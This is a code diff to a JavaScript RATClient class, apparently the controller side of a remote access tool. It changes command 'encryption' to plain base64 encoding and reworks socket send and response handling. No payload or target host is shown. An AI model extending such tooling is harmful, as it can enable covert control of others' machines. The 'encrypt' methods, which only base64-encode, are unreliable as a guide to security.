@@ -45,26 +45,26 @@ export class RATClient {
   }
 
   /**
-   * Encrypt data (Fernet compatible)
+   * Encrypt data using base64 (matches Python socket communication)
    */
   encrypt(data) {
-    // Simple encryption - in production use proper Fernet implementation
-    const cipher = crypto.createCipher('aes-256-cbc', this.encryptionKey);
-    let encrypted = cipher.update(data, 'utf8', 'base64');
-    encrypted += cipher.final('base64');
-    return encrypted;
+    if (typeof data !== 'string') {
+      data = JSON.stringify(data);
+    }
+    return Buffer.from(data).toString('base64');
   }
 
   /**
-   * Decrypt data (Fernet compatible)
+   * Decrypt data from base64 (matches Python socket communication)
    */
   decrypt(data) {
     try {
-      const decipher = crypto.createDecipher('aes-256-cbc', this.encryptionKey);
-      let decrypted = decipher.update(data, 'base64', 'utf8');
-      decrypted += decipher.final('utf8');
-      return decrypted;
+      if (Buffer.isBuffer(data)) {
+        return data.toString('utf-8');
+      }
+      return Buffer.from(data, 'base64').toString('utf-8');
     } catch (error) {
+      console.error('Decrypt error:', error);
       return data; // Return as-is if decryption fails
     }
   }
@@ -80,24 +80,35 @@ export class RATClient {
     return new Promise((resolve, reject) => {
       const encrypted = this.encrypt(command);
       
-      // Send command
-      this.socket.write(encrypted);
+      try {
+        // Send command with newline delimiter
+        this.socket.write(encrypted + '\n');
+      } catch (err) {
+        return reject(new Error('Failed to send command: ' + err.message));
+      }
 
       // Wait for response
       const timer = setTimeout(() => {
-        reject(new Error('Command timeout'));
+        reject(new Error('Command timeout after ' + timeout + 'ms'));
       }, timeout);
 
-      this.socket.once('data', (data) => {
+      const dataHandler = (data) => {
         clearTimeout(timer);
-        const decrypted = this.decrypt(data.toString());
+        this.socket.removeListener('data', dataHandler);
+        this.socket.removeListener('error', errorHandler);
+        const decrypted = this.decrypt(data);
         resolve(decrypted);
-      });
+      };
 
-      this.socket.once('error', (err) => {
+      const errorHandler = (err) => {
         clearTimeout(timer);
+        this.socket.removeListener('data', dataHandler);
+        this.socket.removeListener('error', errorHandler);
         reject(err);
-      });
+      };
+
+      this.socket.once('data', dataHandler);
+      this.socket.once('error', errorHandler);
     });
   }
 
